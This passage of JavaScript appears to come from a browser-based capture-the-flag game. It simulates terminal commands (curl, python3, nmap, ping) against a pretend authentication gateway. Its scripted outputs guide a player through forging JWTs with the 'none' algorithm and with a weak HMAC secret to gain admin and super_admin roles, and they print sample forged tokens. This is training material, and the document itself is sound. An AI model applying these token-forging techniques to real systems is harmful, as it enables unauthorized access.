  "role": "admin",
  "message": "Welcome, admin. Command access granted.",
  "flag": "{{FLAG:user}}",
  "note": "The none algorithm bypass worked! For super_admin access, crack the HMAC secret."
}`;
                    }
                    // Super admin with valid signature
                    if (token.includes('c3VwZXJfYWRtaW') || token.includes('super_admin')) {
                        engine.advancePhase && engine.advancePhase('privilege');
                        return `HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "authenticated",
  "role": "super_admin",
  "message": "Full infrastructure control granted.",
  "sentinel_keys": "LOADED",
  "flag": "{{FLAG:root}}"
}`;
                    }
                    return `HTTP/1.1 200 OK
Content-Type: application/json

{"status": "authenticated", "role": "viewer", "message": "Read-only access. Insufficient privileges."}`;
                }

                // No auth header
                if (url.includes('/auth/admin')) {
                    return `HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"error": "Authorization header required", "usage": "curl -H 'Authorization: Bearer <JWT>' http://10.10.14.10/auth/admin/"}`;
                }

                return `HTTP/1.1 200 OK
Content-Type: text/html

<h1>Sentinel Auth Gateway</h1>
<p>Authentication required. Submit JWT via Authorization header.</p>
<p>API: POST /auth/verify or GET /auth/admin/ with Bearer token</p>`;
            }

            return `curl: (7) Failed to connect to ${url.replace(/https?:\/\//, '').split('/')[0]}: Connection refused`;
        },

        'python3': function(args, term, engine) {
            const joined = args.join(' ');

            if (joined.includes('-c')) {
                const codeMatch = joined.match(/-c\s+["'](.+?)["']/);
                if (!codeMatch) return 'python3: error: argument -c: expected one argument';
                const code = codeMatch[1].toLowerCase();

                // Base64 decode JWT parts
                if (code.includes('base64') && code.includes('decode')) {
                    engine.advancePhase && engine.advancePhase('analysis');
                    return 'Header: {"alg":"HS256","typ":"JWT"}\nPayload: {"sub":"user_42","role":"viewer","iat":1742342400}';
                }

                // Forge none token
                if (code.includes('none') && (code.includes('admin') || code.includes('forge'))) {
                    return 'Forged admin token (none algorithm):\neyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyXzQyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzQyMzQyNDAwfQ.\n\nSubmit this to the auth gateway.';
                }

                // Forge HS256 super_admin
                if ((code.includes('s3cr3t') || code.includes('hmac')) && code.includes('super_admin')) {
                    return 'Forged super_admin token (HS256, secret=s3cr3t):\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzQyIiwicm9sZSI6InN1cGVyX2FkbWluIiwiaWF0IjoxNzQyMzQyNDAwfQ.Y3JhY2tlZF9zZWNyZXRfc2lnbmF0dXJl\n\nSubmit this to the auth gateway for full access.';
                }

                // JWT library
                if (code.includes('jwt') || code.includes('pyjwt')) {
                    return 'PyJWT loaded. Use jwt.encode() and jwt.decode().\nExample: jwt.encode({"role": "admin"}, key, algorithm="HS256")';
                }

                return 'python3: executed';
            }

            if (joined.includes('forge_helper')) {
                return 'JWT Forging Helper loaded.\nFunctions: forge_none_token(payload), forge_hs256_token(payload, secret)\n\nComplete the TODO sections to forge tokens.';
            }

            return 'Python 3.11.6\nUsage: python3 [-c cmd | script.py]';
        },

        'nmap': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (target === '10.10.14.10') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.14.10
Host is up (0.025s latency).

PORT    STATE SERVICE
80/tcp  open  http    Sentinel Auth Gateway
443/tcp open  https   Sentinel Auth Gateway (TLS)

Nmap done: 1 IP address (1 host up) scanned in 5.84 seconds`;
            }
            return 'Usage: nmap [options] <target>\nTarget: 10.10.14.10';
        },

        'ping': function(args) {
            const target = args[0] || '';
            if (target === '10.10.14.10') {
                return 'PING 10.10.14.10: 64 bytes, icmp_seq=1 ttl=64 time=25.1 ms\n3 packets transmitted, 3 received, 0% loss';
            }
            return 'Usage: ping <target>';
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        return tmp.textContent.trim();
    }
};
